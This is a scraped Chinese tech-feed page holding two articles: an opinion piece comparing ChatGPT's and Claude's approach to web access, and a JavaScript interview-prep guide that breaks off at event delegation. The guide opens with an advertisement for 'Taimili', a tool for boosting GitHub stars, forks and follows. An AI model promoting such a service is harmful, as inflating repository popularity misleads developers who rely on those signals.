pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>如果你同时深度使用过 <strong>Claude</strong> 和 <strong>ChatGPT</strong>，大概率会有一个直观感受：</p>
<blockquote>
<p><strong>ChatGPT 更像“会自己上网的助理”， Claude 更像“等你把资料递给它的工程师”。</strong></p>
</blockquote>
<p>这不是能力强弱的问题，而是<strong>设计哲学的根本差异</strong>。</p>
<p>这篇文章不站队、不拉踩，从「<strong>联网能力的设计</strong>」这个维度，系统拆解 Claude 和 ChatGPT 的不同取舍，以及它们各自更适合什么场景。</p>
<hr/>
<h2 data-id="heading-0">一、先给结论（给忙的人）</h2>
<p>一句话总结：</p>
<blockquote>
<p><strong>ChatGPT 把“联网”当产品能力， Claude 把“数据来源”当工程边界。</strong></p>
</blockquote>
<p>这直接导致了它们在使用体验、稳定性、安全性、工程可控性上的巨大差异。</p>
<hr/>
<h2 data-id="heading-1">二、ChatGPT：把“联网”做成默认能力</h2>
<h3 data-id="heading-2">1️⃣ 使用感受：像在用“AI 浏览器”</h3>
<p>在 ChatGPT 中，你可以很自然地说：</p>
<blockquote>
<ul>
<li>帮我查一下某个官网的最新文档</li>
<li>搜一下最近的新闻</li>
<li>看下某个 GitHub 项目的 README</li>
</ul>
</blockquote>
<p>模型会<strong>自动决定是否联网、什么时候搜、搜哪些页面</strong>。</p>
<p>对用户来说，这是极强的“魔法感”。</p>
<hr/>
<h3 data-id="heading-3">2️⃣ 设计特点</h3>
<p><strong>ChatGPT 的联网设计核心是：体验优先</strong></p>
<ul>
<li>✅ 自动搜索</li>
<li>✅ 自动筛选网页</li>
<li>✅ 自动总结结果</li>
<li>❌ 数据来源不完全可控</li>
<li>❌ 不一定知道模型具体看了哪些页面</li>
</ul>
<p>你得到的是结论，而不是过程。</p>
<hr/>
<h3 data-id="heading-4">3️⃣ 适合谁？</h3>
<ul>
<li>内容创作者</li>
<li>产品经理</li>
<li>轻度工程需求</li>
<li>日常搜索、调研、学习</li>
</ul>
<blockquote>
<p>👉 <strong>你关心的是“答案”，不是“数据从哪来”</strong></p>
</blockquote>
<hr/>
<h2 data-id="heading-5">三、Claude：把“联网”当成工程能力</h2>
<p>Claude 的思路几乎是反过来的。</p>
<h3 data-id="heading-6">1️⃣ Claude 默认：<strong>我不联网</strong></h3>
<p>在 Claude 里：</p>
<ul>
<li>不会偷偷搜索</li>
<li>不会默认抓网页</li>
<li>不会假设你允许它访问互联网</li>
</ul>
<p>你必须<strong>明确告诉它</strong>：</p>
<ul>
<li>数据来自哪里</li>
<li>通过什么方式获取</li>
<li>是否可信</li>
</ul>
<hr/>
<h3 data-id="heading-7">2️⃣ Claude 的核心理念</h3>
<blockquote>
<p><strong>Context is a contract（上下文是一种契约）</strong></p>
</blockquote>
<p>Claude 非常“轴”地坚持一件事：</p>
<ul>
<li>我只基于你给我的上下文推理</li>
<li>数据来源必须明确</li>
<li>不制造“黑箱知识”</li>
</ul>
<p>这也是为什么 Claude 在企业、法律、合规场景中评价极高。</p>
<hr/>
<h3 data-id="heading-8">3️⃣ Claude 的联网方式，其实是“外包”的</h3>
<p>Claude 把联网拆成了三层：</p>





















<table><thead><tr><th>层级</th><th>说明</th></tr></thead><tbody><tr><td>Web Fetch</td><td>受控网页抓取</td></tr><tr><td>MCP</td><td>你自建的数据访问能力</td></tr><tr><td>人工注入</td><td>你自己贴数据</td></tr></tbody></table>
<p><strong>模型只负责推理，不负责“偷偷获取信息”</strong> 。</p>
<hr/>
<h2 data-id="heading-9">四、两种设计哲学的正面对比</h2>
<h3 data-id="heading-10">1️⃣ 是否默认联网</h3>

























<table><thead><tr><th>项目</th><th>ChatGPT</th><th>Claude</th></tr></thead><tbody><tr><td>默认联网</td><td>✅ 是</td><td>❌ 否</td></tr><tr><td>自动搜索</td><td>✅</td><td>❌</td></tr><tr><td>明确授权</td><td>❌</td><td>✅</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-11">2️⃣ 数据可控性</h3>

























<table><thead><tr><th>维度</th><th>ChatGPT</th><th>Claude</th></tr></thead><tbody><tr><td>数据来源可追溯</td><td>一般</td><td>非常强</td></tr><tr><td>是否可审计</td><td>较弱</td><td>很强</td></tr><tr><td>企业可控性</td><td>中</td><td>高</td></tr></tbody></table>
<hr/>
<h3 data-id="heading-12">3️⃣ 工程集成能力</h3>

























<table><thead><tr><th>维度</th><th>ChatGPT</th><th>Claude</th></tr></thead><tbody><tr><td>适合快速用</td><td>✅</td><td>⚠️</td></tr><tr><td>适合系统集成</td><td>⚠️</td><td>✅</td></tr><tr><td>适合严肃系统</td><td>一般</td><td>很强</td></tr></tbody></table>
<hr/>
<h2 data-id="heading-13">五、一个典型场景对比</h2>
<h3 data-id="heading-14">场景：分析线上技术文档</h3>
<h4 data-id="heading-15">ChatGPT 的方式</h4>
<blockquote>
<p>“我帮你搜了一些资料，结论是……”</p>
</blockquote>
<p>优点：</p>
<ul>
<li>快</li>
<li>省事</li>
</ul>
<p>问题：</p>
<ul>
<li>你不知道它看了哪些版本</li>
<li>文档是否最新不确定</li>
<li>不适合做技术基准</li>
</ul>
<hr/>
<h4 data-id="heading-16">Claude 的方式</h4>
<blockquote>
<p>“请你通过 Web Fetch / MCP 获取该文档内容，然后我来分析。”</p>
</blockquote>
<p>优点：</p>
<ul>
<li>数据来源清晰</li>
<li>可复现</li>
<li>可审计</li>
</ul>
<p>问题：</p>
<ul>
<li>前期成本略高</li>
<li>对非工程用户不友好</li>
</ul>
<hr/>
<h2 data-id="heading-17">六、为什么 Claude 这么“反人性”？</h2>
<p>这是很多人一开始用 Claude 会吐槽的点。</p>
<p>但站在工程角度，这是<strong>刻意为之</strong>。</p>
<p>Claude 的目标用户并不只是普通消费者，而是：</p>
<ul>
<li>企业</li>
<li>法务</li>
<li>金融</li>
<li>研发团队</li>
<li>AI 系统集成方</li>
</ul>
<p>在这些场景中：</p>
<blockquote>
<p><strong>“我确定模型用了什么数据” 比 “模型很聪明” 更重要。</strong></p>
</blockquote>
<hr/>
<h2 data-id="heading-18">七、到底该怎么选？</h2>
<h3 data-id="heading-19">如果你更关心：</h3>
<ul>
<li>快速答案</li>
<li>灵感</li>
<li>调研效率</li>
</ul>
<p>👉 <strong>选 ChatGPT</strong></p>
<hr/>
<h3 data-id="heading-20">如果你更关心：</h3>
<ul>
<li>数据可信度</li>
<li>工程可控</li>
<li>可复现性</li>
<li>企业级使用</li>
</ul>
<p>👉 <strong>选 Claude</strong></p>
<hr/>
<h2 data-id="heading-21">八、一句话总结</h2>
<blockquote>
<p><strong>ChatGPT 是“会自己上网的助理”， Claude 是“等你提供资料的高级分析师”。</strong></p>
</blockquote>
<p>一个追求<strong>极致体验</strong>， 一个追求<strong>工程边界清晰</strong>。</p>
<p>没有谁更高级， 只是你站在哪一侧。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[github加星 star 艾米莉 2026 前端面试核心：JavaScript 基础篇（精炼版）]]></title>    <link>https://juejin.cn/post/7597270795211620392</link>    <guid>https://juejin.cn/post/7597270795211620392</guid>    <pubDate>2026-01-20T10:04:24.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7597270795211620392" data-draft-id="7597259271110066216" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="github加星  star 艾米莉  2026 前端面试核心：JavaScript 基础篇（精炼版）"/> <meta itemprop="keywords" content="GitHub,Java"/> <meta itemprop="datePublished" content="2026-01-20T10:04:24.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="开源之眼"/> <meta itemprop="url" content="https://juejin.cn/user/55438993800919"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            github加星  star 艾米莉  2026 前端面试核心：JavaScript 基础篇（精炼版）
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/55438993800919/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    开源之眼
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2026-01-20T10:04:24.000Z" title="Tue Jan 20 2026 10:04:24 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2026-01-20
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>掌握 JavaScript 基础是前端工程师的必备素养，不仅是日常开发的核心支撑，更是向中高级岗位进阶的关键基石。以下梳理了面试高频考察点，结合核心原理与实战案例，助力高效备战面试。</p>
<h5 data-id="heading-0">Taimili 艾米莉 ( 一款专业的 GitHub star 管理和github 加星涨星工具<a href="https://link.juejin.cn?target=taimili.com" title="https://link.juejin.cn?target=taimili.com" target="_blank">taimili.com</a> )</h5>
<p>艾米莉 是一款优雅便捷的 GitHub star 管理和github 加星涨星工具，基于 PHP &amp; javascript 构建， 能对github 得 star fork follow watch 管理和提升，最适合github 的深度用户</p>
<p><img src="https://p3-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/1ef7b5a991694a99be4603b179ad8d28~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg5byA5rqQ5LmL55y8:q75.awebp?rk3s=f64ab15b&amp;x-expires=1769508264&amp;x-signature=LHtUPDyeE%2FAIIDjKdgg3Ha4r7bc%3D" alt="WX20251021-210346@2x.png" loading="lazy"/></p>
<h4 data-id="heading-1"/>
<h2 data-id="heading-2">一、数据类型与内存机制</h2>
<h3 data-id="heading-3">1. 基本数据类型</h3>
<p>包含 <code>String</code>、<code>Number</code>、<code>Boolean</code>、<code>Null</code>、<code>Undefined</code>、ES6 新增的 <code>Symbol</code>（唯一值）、ES2020 新增的 <code>BigInt</code>（大整数）。</p>
<ul>
<li>存储位置：栈内存（Stack）</li>
<li>核心特性：变量直接持有值，赋值操作是<strong>值的复制</strong>，修改新变量不影响原变量。</li>
</ul>
<h3 data-id="heading-4">2. 引用数据类型</h3>
<p>以 <code>Object</code> 为基础，涵盖普通对象、<code>Array</code>、<code>Function</code>、<code>Date</code> 等。</p>
<ul>
<li>存储机制：对象实体存于堆内存（Heap），变量仅持有指向堆内存的<strong>引用地址</strong>（引用存于栈内存）</li>
<li>核心特性：赋值操作是<strong>引用的复制</strong>，多个变量可能指向同一对象，修改任一变量的属性会影响所有关联变量。</li>
</ul>
<h3 data-id="heading-5">3. 经典面试案例</h3>
<p>javascript</p>
<p>运行</p>
<pre><code class="hljs language-ini" lang="ini">// 基本类型赋值：值复制，互不影响
let <span class="hljs-attr">a</span> = <span class="hljs-number">10</span><span class="hljs-comment">;</span>
let <span class="hljs-attr">b</span> = a<span class="hljs-comment">;</span>
<span class="hljs-attr">b</span> = <span class="hljs-number">20</span><span class="hljs-comment">;</span>
console.log(a)<span class="hljs-comment">; // 输出：10</span>

// 引用类型赋值：引用复制，指向同一对象
let <span class="hljs-attr">obj1</span> = { name: <span class="hljs-string">'Mickey'</span> }<span class="hljs-comment">;</span>
let <span class="hljs-attr">obj2</span> = obj1<span class="hljs-comment">;</span>
<span class="hljs-attr">obj2.name</span> = <span class="hljs-string">'Donald'</span><span class="hljs-comment">;</span>
console.log(obj1.name)<span class="hljs-comment">; // 输出：Donald</span>
</code></pre>
<h3 data-id="heading-6">4. 类型判断方法</h3>




















<table><thead><tr><th>方法</th><th>适用场景</th><th>局限性</th></tr></thead><tbody><tr><td><code>typeof</code></td><td>快速判断基本类型</td><td>1. <code>typeof null</code> 返回 <code>object</code>（历史遗留）；2. 无法区分对象子类型（如 Array、Date）</td></tr><tr><td><code>instanceof</code></td><td>判断对象是否为构造函数实例</td><td>基于原型链查找，Array 实例同时属于 Object</td></tr></tbody></table>
<p>javascript</p>
<p>运行</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-keyword">typeof</span> []); <span class="hljs-comment">// "object"（无法识别数组）</span>
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>([<span class="hljs-number">1</span>,<span class="hljs-number">2</span>,<span class="hljs-number">3</span>] <span class="hljs-keyword">instanceof</span> <span class="hljs-title class_">Array</span>); <span class="hljs-comment">// true（正确识别数组）</span>
</code></pre>
<h2 data-id="heading-7">二、变量声明：var、let 与 const（ES6 必考点）</h2>
<p>三者核心差异是面试高频题，需精准掌握作用域、提升机制等关键特性：</p>



































<table><thead><tr><th>特性</th><th>var</th><th>let</th><th>const</th></tr></thead><tbody><tr><td>作用域</td><td>函数作用域</td><td>块级作用域（<code>{}</code> 包裹）</td><td>块级作用域（<code>{}</code> 包裹）</td></tr><tr><td>变量提升</td><td>存在（仅声明提升）</td><td>无（存在暂时性死区 TDZ）</td><td>无（存在暂时性死区 TDZ）</td></tr><tr><td>重复声明</td><td>允许</td><td>不允许</td><td>不允许</td></tr><tr><td>重新赋值</td><td>允许</td><td>允许</td><td>不允许（引用不可变）</td></tr></tbody></table>
<h3 data-id="heading-8">关键考点解析</h3>
<ul>
<li>暂时性死区（TDZ）：<code>let</code>/<code>const</code> 声明前访问变量会抛出 ReferenceError，避免变量提前使用</li>
<li><code>const</code> 的 "不变性"：仅保证<strong>引用地址不变</strong>，对象 / 数组的内部属性可修改</li>
</ul>
<p>javascript</p>
<p>运行</p>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">person</span> = { age: <span class="hljs-number">30</span> }<span class="hljs-comment">;</span>
<span class="hljs-attr">person.age</span> = <span class="hljs-number">31</span><span class="hljs-comment">; // 允许，修改内部属性</span>
// <span class="hljs-attr">person</span> = {}<span class="hljs-comment">; // 报错，禁止修改引用地址</span>
</code></pre>
<h2 data-id="heading-9">三、运算符（重点掌握短路特性）</h2>
<h3 data-id="heading-10">1. 核心运算符分类</h3>
<ul>
<li>算术运算符：<code>+</code>、<code>-</code>、<code>*</code>、<code>/</code>、<code>%</code>（取模）、<code>**</code>（ES7 幂运算）</li>
<li>比较运算符：<code>==</code>（类型转换后比较）、<code>===</code>（严格相等，推荐使用）</li>
<li>逻辑运算符：<code>&amp;&amp;</code>（与）、<code>||</code>（或）（均支持短路求值）</li>
<li>三元运算符：<code>condition ? 真结果 : 假结果</code>（简洁替代简单 if-else）</li>
</ul>
<h3 data-id="heading-11">2. 短路特性实战（开发高频用法）</h3>
<p>javascript</p>
<p>运行</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-comment">// &amp;&amp; 短路：第一个假值直接返回，后续不执行</span>
<span class="hljs-keyword">const</span> userName = user &amp;&amp; user.<span class="hljs-property">name</span>; <span class="hljs-comment">// 安全访问嵌套属性，避免报错</span>
<span class="hljs-keyword">const</span> result1 = <span class="hljs-number">0</span> &amp;&amp; <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">'不会执行'</span>); <span class="hljs-comment">// 输出：0</span>

<span class="hljs-comment">// || 短路：第一个真值直接返回，后续不执行</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">greet</span>(<span class="hljs-params">name</span>) {
  name = name || <span class="hljs-string">'Guest'</span>; <span class="hljs-comment">// ES6前的默认参数方案</span>
  <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`Welcome, <span class="hljs-subst">${name}</span>`</span>);
}
<span class="hljs-title function_">greet</span>(); <span class="hljs-comment">// 输出：Welcome, Guest</span>
</code></pre>
<h2 data-id="heading-12">四、流程控制</h2>
<h3 data-id="heading-13">1. 条件语句</h3>
<ul>
<li><code>if...else if...else</code>：处理多条件判断</li>
<li><code>switch</code>：单值多分支场景，需注意 <code>break</code> 防止穿透</li>
</ul>
<p>javascript</p>
<p>运行</p>
<pre><code class="hljs language-php" lang="php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFruitColor</span>(<span class="hljs-params">fruit</span>) </span>{
  <span class="hljs-keyword">switch</span> (fruit) {
    <span class="hljs-keyword">case</span> <span class="hljs-string">'apple'</span>: <span class="hljs-keyword">return</span> <span class="hljs-string">'red'</span>;
    <span class="hljs-keyword">case</span> <span class="hljs-string">'banana'</span>: <span class="hljs-keyword">return</span> <span class="hljs-string">'yellow'</span>;
    <span class="hljs-keyword">default</span>: <span class="hljs-keyword">return</span> <span class="hljs-string">'unknown'</span>;
  }
}
</code></pre>
<h3 data-id="heading-14">2. 循环语句</h3>






























<table><thead><tr><th>循环类型</th><th>适用场景</th><th>特点</th></tr></thead><tbody><tr><td><code>for</code></td><td>已知循环次数</td><td>灵活控制索引</td></tr><tr><td><code>while</code></td><td>未知循环次数，条件前置</td><td>条件不满足则不执行</td></tr><tr><td><code>do...while</code></td><td>未知循环次数，条件后置</td><td>至少执行一次</td></tr><tr><td><code>for...of</code></td><td>遍历可迭代对象（数组、字符串等）</td><td>直接获取值，语法简洁</td></tr></tbody></table>
<p>javascript</p>
<p>运行</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">const</span> numbers = [<span class="hljs-number">10</span>, <span class="hljs-number">20</span>, <span class="hljs-number">30</span>];
<span class="hljs-comment">// for...of 遍历（推荐）</span>
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> <span class="hljs-built_in">num</span> of numbers) {
  console.log(<span class="hljs-built_in">num</span>); <span class="hljs-comment">// 输出：10、20、30</span>
}
</code></pre>
<h2 data-id="heading-15">五、函数（JavaScript 一等公民）</h2>
<h3 data-id="heading-16">1. 三种声明方式对比</h3>

























<table><thead><tr><th>声明方式</th><th>语法示例</th><th>核心特性</th></tr></thead><tbody><tr><td>函数声明</td><td><code>function sum(a,b) { return a+b }</code></td><td>存在函数提升，可在声明前调用</td></tr><tr><td>函数表达式</td><td><code>const multiply = function(a,b){}</code></td><td>遵循变量提升规则，声明前不可调用</td></tr><tr><td>箭头函数（ES6）</td><td><code>const subtract = (a,b) =&gt; a-b</code></td><td>语法简洁，this 绑定词法作用域</td></tr></tbody></table>
<h3 data-id="heading-17">2. 面试高频考点：函数提升</h3>
<p>javascript</p>
<p>运行</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-title function_">declaredSum</span>(<span class="hljs-number">2</span>,<span class="hljs-number">3</span>)); <span class="hljs-comment">// 输出：5（函数声明提升）</span>
<span class="hljs-keyword">function</span> <span class="hljs-title function_">declaredSum</span>(<span class="hljs-params">a,b</span>) { <span class="hljs-keyword">return</span> a+b; }

<span class="hljs-comment">// console.log(expressedSum(2,3)); // 报错（函数表达式无提升）</span>
<span class="hljs-keyword">const</span> expressedSum = <span class="hljs-keyword">function</span>(<span class="hljs-params">a,b</span>) { <span class="hljs-keyword">return</span> a+b; };
</code></pre>
<h2 data-id="heading-18">六、对象操作</h2>
<h3 data-id="heading-19">1. 核心操作方法</h3>
<ul>
<li>
<p>创建：<code>const obj = { key: 'value' }</code>（字面量语法，推荐）</p>
</li>
<li>
<p>属性访问：</p>
<ul>
<li>点表示法：<code>obj.key</code>（属性名是合法标识符时使用）</li>
<li>方括号表示法：<code>obj['key']</code>（支持特殊字符、动态属性名）</li>
</ul>
</li>
<li>
<p>增删改：<code>obj.newKey = 'newVal'</code>（增 / 改）、<code>delete obj.key</code>（删）</p>
</li>
</ul>
<h3 data-id="heading-20">2. 遍历技巧（避免原型链污染）</h3>
<p>javascript</p>
<p>运行</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> car = { <span class="hljs-attr">make</span>: <span class="hljs-string">'Toyota'</span>, <span class="hljs-attr">model</span>: <span class="hljs-string">'Camry'</span>, <span class="hljs-string">'year-2022'</span>: <span class="hljs-literal">true</span> };
<span class="hljs-comment">// for...in 遍历，仅获取自身属性</span>
<span class="hljs-keyword">for</span> (<span class="hljs-keyword">const</span> key <span class="hljs-keyword">in</span> car) {
  <span class="hljs-keyword">if</span> (car.<span class="hljs-title function_">hasOwnProperty</span>(key)) {
    <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`<span class="hljs-subst">${key}</span>: <span class="hljs-subst">${car[key]}</span>`</span>);
  }
}
</code></pre>
<h2 data-id="heading-21">七、数组（高频操作与方法）</h2>
<h3 data-id="heading-22">1. 核心特性</h3>
<ul>
<li>访问：通过索引 <code>arr[index]</code>，索引从 0 开始</li>
<li><code>length</code>：可读写属性，用于获取长度或截断数组</li>
</ul>
<h3 data-id="heading-23">2. 常用方法分类（面试重点）</h3>




















<table><thead><tr><th>类型</th><th>方法</th><th>特点</th></tr></thead><tbody><tr><td>改变原数组</td><td>push/pop、unshift/shift、splice、sort</td><td>直接修改原数组，需注意副作用</td></tr><tr><td>不改变原数组</td><td>concat、slice、map、filter、find</td><td>返回新数组，原数组保持不变（推荐使用）</td></tr></tbody></table>
<h3 data-id="heading-24">3. 经典面试对比：map vs forEach</h3>
<p>javascript</p>
<p>运行</p>
<pre><code class="hljs language-javascript" lang="javascript"><span class="hljs-keyword">const</span> ids = [<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">3</span>];
<span class="hljs-comment">// forEach：仅遍历，无返回值</span>
ids.<span class="hljs-title function_">forEach</span>(<span class="hljs-function"><span class="hljs-params">id</span> =&gt;</span> <span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(<span class="hljs-string">`处理ID：<span class="hljs-subst">${id}</span>`</span>));

<span class="hljs-comment">// map：映射转换，返回新数组（核心用途）</span>
<span class="hljs-keyword">const</span> urls = ids.<span class="hljs-title function_">map</span>(<span class="hljs-function"><span class="hljs-params">id</span> =&gt;</span> <span class="hljs-string">`/users/<span class="hljs-subst">${id}</span>`</span>);
<span class="hljs-variable language_">console</span>.<span class="hljs-title function_">log</span>(urls); <span class="hljs-comment">// 输出：['/users/1', '/users/2', '/users/3']</span>
</code></pre>
<h2 data-id="heading-25">八、DOM 操作与事件模型</h2>
<h3 data-id="heading-26">1. 高效 DOM 操作（性能优化考点）</h3>
<p>大量添加节点时，使用 <code>DocumentFragment</code> 减少重排（reflow）和重绘（repaint）：</p>
<p>javascript</p>
<p>运行</p>
<pre><code class="hljs language-ini" lang="ini">const <span class="hljs-attr">list</span> = document.getElementById(<span class="hljs-string">'my-list'</span>)<span class="hljs-comment">;</span>
const <span class="hljs-attr">fragment</span> = document.createDocumentFragment()<span class="hljs-comment">; // 临时容器</span>

// 先添加到片段（无DOM重排）
for (let <span class="hljs-attr">i</span> = <span class="hljs-number">0</span><span class="hljs-comment">; i &lt; 1000; i++) {</span>
  const <span class="hljs-attr">li</span> = document.createElement(<span class="hljs-string">'li'</span>)<span class="hljs-comment">;</span>
  <span class="hljs-attr">li.textContent</span> = `Item <span class="hljs-variable">${i+1}</span>`<span class="hljs-comment">;</span>
  fragment.appendChild(li)<span class="hljs-comment">;</span>
}

// 一次性插入DOM（仅1次重排）
list.appendChild(fragment)<span class="hljs-comment">;</span>
</code></pre>
<h3 data-id="heading-27">2. 事件委托（性能优化 + 动态元素适配）</h3>
